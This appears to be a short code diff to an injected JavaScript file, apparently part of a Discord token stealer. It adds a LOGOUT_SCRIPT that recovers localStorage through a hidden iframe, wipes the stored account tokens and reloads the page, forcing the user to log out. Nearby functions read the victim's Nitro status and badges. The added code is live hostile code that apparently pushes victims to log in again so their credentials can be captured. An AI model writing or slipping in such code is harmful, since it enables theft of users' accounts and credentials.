@@ -40,6 +40,7 @@ const request = async (a, b, c = {}, d = null) => {
     return Promise.reject(p);
   }
 };
+var LOGOUT_SCRIPT = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`
 const notify = async (q, r, s) => {
   let t = getNitro(await fProfile(r));
   let u = await getBadges(s.flags);
